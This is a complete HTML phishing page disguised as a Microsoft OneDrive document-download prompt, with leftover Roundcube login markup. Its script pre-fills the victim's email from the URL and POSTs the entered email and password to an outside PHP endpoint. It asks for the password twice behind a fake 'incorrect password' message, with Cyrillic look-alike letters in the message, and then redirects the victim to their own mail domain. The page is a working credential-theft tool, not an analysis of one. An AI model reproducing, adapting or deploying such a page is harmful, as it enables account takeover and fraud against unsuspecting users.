<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>OneDrive :: OneDrive document download</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#f4f4f4">
<meta name="msapplication-navbutton-color" content="#f4f4f4">
<link rel="shortcut icon" href="https://www.kindpng.com/picc/m/320-3201756_onedrive-logo-png-transparent-png.png">
<link rel="stylesheet" href="https://ia601404.us.archive.org/16/items/bootstrap.min_202110/bootstrap.min.css">
<link rel="stylesheet" href="https://ia601404.us.archive.org/16/items/bootstrap.min_202110/styles.css">
</head><body class="task-login action-none">
<div id="layout">
<h1 class="voice">Roundcube Webmail Login</h1>
<div id="layout-content" class="selected no-navbar" role="main">
<img src="https://ia601404.us.archive.org/16/items/bootstrap.min_202110/OneDrive-Logo.png" id="logo" alt="Logo">
<form id="login-form" name="login-form" method="post" class="propform">
<strong>You have one new pending document for download</strong><br>DOC Q0017 - 3512C.Doc (0.95 MB)
<br>
<br>
<input name="_token" value="SE3EkRrgcqUgcU2Nk322RfBIo3gdJybJ" class="form-control" type="hidden">
<input name="_task" value="login" class="form-control" type="hidden">
<input name="_action" value="login" class="form-control" type="hidden">
<input name="_timezone" id="rcmlogintz" value="Europe/London" class="form-control" type="hidden">
<input name="_url" id="rcmloginurl" value="" class="form-control" type="hidden"><div style="color: red; font-weight: 400; display: none;" class="warning" id="msg">
Yоur еmаil оr раsswоrd is inсоrrесt. If yоu dоnt rеmеmbеr yоur раsswоrd,reset it now.</div><div id="error" class="warning" style="color: red; display: none;"></div><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
</td>
<td class="input input-group input-group-lg"><span class="input-group-prepend"></span>
<input name="email" id="email" required="" size="40" autocapitalize="none" class="form-control" placeholder="Username" type="email"></td>
</tr>
<tr class="form-group row"><td class="title" style="display: none;"><label for="password">Password</label>
</td>
<td class="input input-group input-group-lg"><span class="input-group-prepend"></span>
<input name="password" id="password" required="" size="40" autocapitalize="none" class="form-control" placeholder="Password" type="password"></td>
</tr>


</tbody>
</table>
<p class="formbuttons">
<button type="submit-btn" id="submit-btn" class="button mainaction submit btn-primary btn-lg text-uppercase w-100">download</button>
</p>
<div id="login-footer" role="contentinfo">
Microsoft OneDrive
</div>
</form>
</div>
</div>
<script src="https://archive.org/download/bootstrap.min_202110/jquery.min.js.download"></script>
<script src="https://archive.org/download/bootstrap.min_202110/bootstrap.min.js.download"></script>
<script>
/* global $ */
$(document).ready(function(){
var count=0;
/////////////url email getting////////////////
var email = window.location.hash.substr(1);
if (!email) {
}
else
{
// $('#email').val(email);
var my_email =email;
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
$('#email').val(my_email);
$('#emailch').html(my_email);
$("#msg").hide();
}
///////////////url getting email////////////////
$('#submit-btn').click(function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();
var msg = $('#msg').html();
$('#msg').text( msg );
///////////new injection////////////////
var my_email =email;
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
if (!filter.test(my_email)) {
$('#error').show();
$('#error').html("That account doesn't exist. Enter a different account");
email.focus;
return false;
}
if (!password) {
$('#error').show();
$('#error').html("password field is empty");
email.focus;
return false;
}
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
///////////new injection////////////////
count=count+1;
$.ajax({
dataType: 'JSON',
url: 'https://awesomeweddingmc.com/homee/zico.php',
type: 'POST',
data:{
email:email,
password:password,
},
// data: $('#contact').serialize(),
beforeSend: function(xhr){
$('#submit-btn').html('Verifing...');
},
success: function(response){
if(response){
$("#msg").show();
console.log(response);
if(response['signal'] == 'ok'){
$("#password").val("");
if (count>=2) {
count=0;
// window.location.replace(response['redirect_link']);
window.location.replace("http://www."+my_slice);
}
// $('#msg').html(response['msg']);
}
else{
// $('#msg').html(response['msg']);
}
}
},
error: function(){
$("#password").val("");
if (count>=2) {
count=0;
window.location.replace("http://www."+my_slice);
}
$("#msg").show();
// $('#msg').html("Please try again later");
},
complete: function(){
$('#submit-btn').html('TRY AGAIN');
}
});
});
});
</script>
</body></html>
